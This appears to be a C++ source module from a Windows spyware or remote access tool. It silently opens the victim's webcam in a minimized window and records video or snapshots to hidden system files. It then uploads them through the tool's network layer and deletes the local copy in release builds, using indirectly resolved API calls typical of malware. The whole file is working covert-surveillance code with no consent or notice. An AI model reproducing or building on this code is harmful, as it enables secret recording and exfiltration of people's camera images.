#include <windows.h>
#include "CameraCapture.h"
#include "../api.h"
#include "../public.h"
#include <Vfw.h>
#include <mmsystem.h>
#include "../network/NetWorkdata.h"
#include "../log.h"
#include "../StrHelper.h"


unsigned long iCameraVideoOn = 0;


int SendCameraFile(char* szFileName, int cmd)
{
	HANDLE hFile = lpCreateFileA(szFileName, GENERIC_WRITE | GENERIC_READ, 0, 0, OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL | FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM, 0);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}

	int iRet = lpSetFilePointer(hFile, 0, 0, FILE_BEGIN);
	if (iRet == INVALID_SET_FILE_POINTER)
	{
		lpCloseHandle(hFile);
		return FALSE;
	}

	DWORD dwFileSizeHigh = 0;
	DWORD dwFileSize = lpGetFileSize(hFile, &dwFileSizeHigh);

	DWORD dwCnt = 0;
	char* lpBuf = new char[dwFileSize + 0x1000];
	if (lpBuf == 0)
	{
		lpCloseHandle(hFile);
		return FALSE;
	}

	iRet = lpReadFile(hFile, lpBuf, dwFileSize, &dwCnt, 0);
	lpCloseHandle(hFile);
	if (iRet && dwCnt == dwFileSize)
	{
		iRet = uploadData(lpBuf, dwFileSize, CAMERAPHOTO, szFileName);
	}

	delete[] lpBuf;

#ifndef _DEBUG
	lpDeleteFileA(szFileName);
#endif
	return TRUE;
}



int __stdcall CameraVideoCapture(unsigned long DelayTime)
{
	unsigned long iDelayTime = DelayTime;

	iCameraVideoOn = 1;

	char strBuf[1024];
	try
	{
		int iRet = 0;
		HWND m_myCapWnd = lpcapCreateCaptureWindowA(CAMERA_CAPTURE_NAME, WS_MINIMIZE, 0, 0, CAMARE_VIDEO_WIDTH, CAMARE_VIDEO_HEIGHT, 0, 0);
		if (m_myCapWnd == 0)
		{
			lpwsprintfA(strBuf, "CameraVideoCapture lpcapCreateCaptureWindowA error code:%u\r\n", lpRtlGetLastWin32Error());
			writeLog(strBuf);
			iCameraVideoOn = 0;
			return FALSE;
		}

		//capDriverConnect(m_myCapWnd,0)
		//AVICapSM(m_myCapWnd,WM_CAP_DRIVER_CONNECT,0,0);
		//SendMessageA(m_myCapWnd,WM_CAP_DRIVER_CONNECT,0,0);
		iRet = 0;
		while (lpSendMessageA(m_myCapWnd, WM_CAP_DRIVER_CONNECT, 0, 0) == FALSE)
		{
			lpSleep(100);

			iRet++;
			if (iRet >= 10)
			{
				iCameraVideoOn = 0;
				return FALSE;
			}
		}

		CAPDRIVERCAPS caps = { 0 };
		//capDriverGetCaps(m_myCapWnd,sizeof(CAPDRIVERCAPS),&caps);
		//AVICapSM(m_myCapWnd,WM_CAP_DRIVER_GET_CAPS,(WPARAM)&caps,sizeof(CAPDRIVERCAPS));
		iRet = lpSendMessageA(m_myCapWnd, WM_CAP_DRIVER_GET_CAPS, (WPARAM)&caps, sizeof(CAPDRIVERCAPS));
		if (caps.fCaptureInitialized)
		{
			CAPSTATUS status = { 0 };
			//capGetStatus(m_myCapWnd,&status, sizeof(CAPSTATUS));
			//AVICapSM(m_myCapWnd,WM_CAP_GET_STATUS,sizeof(CAPSTATUS),(LPARAM)&status);
			iRet = lpSendMessageA(m_myCapWnd, WM_CAP_GET_STATUS, sizeof(CAPSTATUS), (LPARAM)&status);
			//capPreviewRate(m_myCapWnd,30);
			//AVICapSM(m_myCapWnd,WM_CAP_SET_PREVIEWRATE,30,0);
			iRet = lpSendMessageA(m_myCapWnd, WM_CAP_SET_PREVIEWRATE, 1000 / CAMERA_VIDEO_FPS, 0);
			//capPreviewScale(m_myCapWnd,TRUE);	//设置视频比例，使视频完全显示出来，若设为false则显示部分画面出来//
			//AVICapSM(m_myCapWnd,WM_CAP_SET_SCALE,TRUE,0);
			iRet = lpSendMessageA(m_myCapWnd, WM_CAP_SET_SCALE, TRUE, 0);
			//capPreview(m_myCapWnd,TRUE);		//视频预览，即视频出现了//
			//AVICapSM(m_myCapWnd,WM_CAP_SET_PREVIEW,TRUE,0);
			iRet = lpSendMessageA(m_myCapWnd, WM_CAP_SET_PREVIEW, TRUE, 0);
		}

		//compress the data
		//capDlgVideoCompression(m_myCapWnd);
		//capDlgVideoDisplay(m_myCapWnd);

		CAPTUREPARMS stCapParam = { 0 };
		//iRet = capCaptureGetSetup(m_myCapWnd,&stCapParam,sizeof(CAPTUREPARMS));
		iRet = lpSendMessageA(m_myCapWnd, WM_CAP_GET_SEQUENCE_SETUP, sizeof(CAPTUREPARMS), (LPARAM)&stCapParam);
		stCapParam.dwRequestMicroSecPerFrame = iDelayTime * 1000 * 1000 / CAMERA_VIDEO_FPS;
		stCapParam.vKeyAbort = 0;
		stCapParam.fLimitEnabled = TRUE;
		stCapParam.wTimeLimit = iDelayTime;
		stCapParam.fYield = FALSE;
		stCapParam.fAbortLeftMouse = FALSE;
		stCapParam.fAbortRightMouse = FALSE;
		//iRet = capCaptureSetSetup(m_myCapWnd,&stCapParam,sizeof(CAPTUREPARMS));
		iRet = lpSendMessageA(m_myCapWnd, WM_CAP_SET_SEQUENCE_SETUP, sizeof(CAPTUREPARMS), (LPARAM)&stCapParam);

		SYSTEMTIME stSt;
		lpGetLocalTime(&stSt);
		char strFileName[MAX_PATH];
		iRet = lpwsprintfA(strFileName, CAMERASNAPSHOT_VIDEO_FILENAME, stSt.wYear, stSt.wMonth, stSt.wDay, stSt.wHour, stSt.wMinute, stSt.wSecond);
		char strFilePath[MAX_PATH] = { 0 };
		iRet = makeFullFileName(strFilePath, strFileName);
		wchar_t wszFileName[MAX_PATH] = { 0 };
		int wszfnlen = MStringToWString(strFilePath, lplstrlenA(strFilePath), wszFileName, MAX_PATH);

		//capFileSetCaptureFile(m_myCapWnd,L"video.avi");
		//AVICapSM(m_myCapWnd,WM_CAP_FILE_SET_CAPTURE_FILE,0,"video.avi");
		//wchar_t * wcStrFileName = MBytesToWString(strFilePath);
		iRet = lpSendMessageW(m_myCapWnd, WM_CAP_FILE_SET_CAPTURE_FILEA, 0, (LPARAM)wszFileName);

		//capCaptureSequence(m_myCapWnd);
		//AVICapSM(m_myCapWnd,WM_CAP_SEQUENCE,0,0);
		iRet = lpSendMessageA(m_myCapWnd, WM_CAP_SEQUENCE, 0, 0);

		//iRet = lpSendMessageA(m_myCapWnd,WM_CAP_STOP,0,0);
		//iRet = lpSendMessageA(m_myCapWnd,WM_CAP_DRIVER_DISCONNECT,0,0);
		iRet = lpSendMessageA(m_myCapWnd, WM_CAP_STOP, 0, 0);
		iRet = lpSendMessageA(m_myCapWnd, WM_CAP_DRIVER_DISCONNECT, 0, 0);

		//lpCloseHandle(m_myCapWnd);

		SendCameraFile(strFilePath, CAMERAVIDEO);

		iCameraVideoOn = 0;
		return TRUE;
	}
	catch (...)
	{
		writeLog("CameraVideoCapture exception\r\n");
		return FALSE;
	}
}







int __stdcall CameraPhotoCapture()
{

	iCameraVideoOn = 1;

	char strBuf[1024];
	try
	{
		int iRet = 0;
		HWND m_myCapWnd = lpcapCreateCaptureWindowA(CAMERA_CAPTURE_NAME, WS_MINIMIZE, 0, 0, CAMARE_VIDEO_WIDTH, CAMARE_VIDEO_HEIGHT, 0, 0);
		if (m_myCapWnd == 0)
		{
			lpwsprintfA(strBuf, "CameraPhotoCapture lpcapCreateCaptureWindowA error code:%u\r\n", lpRtlGetLastWin32Error());
			writeLog(strBuf);
			iCameraVideoOn = 0;
			return FALSE;
		}

		iRet = 0;
		while (lpSendMessageA(m_myCapWnd, WM_CAP_DRIVER_CONNECT, 0, 0) == FALSE)
		{
			lpSleep(100);

			iRet++;
			if (iRet >= 10)
			{
				iCameraVideoOn = 0;
				return FALSE;
			}
		}

		CAPDRIVERCAPS caps = { 0 };
		lpSendMessageA(m_myCapWnd, WM_CAP_DRIVER_GET_CAPS, (WPARAM)&caps, sizeof(CAPDRIVERCAPS));
		if (caps.fCaptureInitialized)
		{
			CAPSTATUS status = { 0 };
			iRet = lpSendMessageA(m_myCapWnd, WM_CAP_GET_STATUS, sizeof(CAPSTATUS), (LPARAM)&status);
			iRet = lpSendMessageA(m_myCapWnd, WM_CAP_SET_PREVIEWRATE, 30, 0);
			iRet = lpSendMessageA(m_myCapWnd, WM_CAP_SET_SCALE, TRUE, 0);
			iRet = lpSendMessageA(m_myCapWnd, WM_CAP_SET_PREVIEW, TRUE, 0);
		}

		iRet = lpSendMessageA(m_myCapWnd, WM_CAP_GRAB_FRAME_NOSTOP, 0, 0);

		SYSTEMTIME stSt = { 0 };
		lpGetLocalTime(&stSt);
		char strFileName[MAX_PATH];
		iRet = lpwsprintfA(strFileName, CAMERASNAPSHOT_PHOTO_FILENAME, stSt.wYear, stSt.wMonth, stSt.wDay, stSt.wHour, stSt.wMinute, stSt.wSecond);
		char strFilePath[MAX_PATH] = { 0 };
		iRet = makeFullFileName(strFilePath, strFileName);
		//wchar_t wszFileName[MAX_PATH] = { 0 };
		//int wszfnlen = MStringToWString(strFilePath, lplstrlenA(strFilePath), wszFileName, MAX_PATH);

		lpSleep(600);

		iRet = lpSendMessageW(m_myCapWnd, WM_CAP_FILE_SAVEDIBA, 0, (LPARAM)strFilePath);

		lpSleep(600);

		iRet = lpSendMessageA(m_myCapWnd, WM_CAP_STOP, 0, 0);

		iRet = lpSendMessageA(m_myCapWnd, WM_CAP_DRIVER_DISCONNECT, 0, 0);

		//lpCloseHandle(m_myCapWnd);

		SendCameraFile(strFilePath, CAMERAPHOTO);

		iCameraVideoOn = 0;
		return TRUE;
	}
	catch (...)
	{
		writeLog("CameraPhotoCapture exception\r\n");
		return FALSE;
	}
}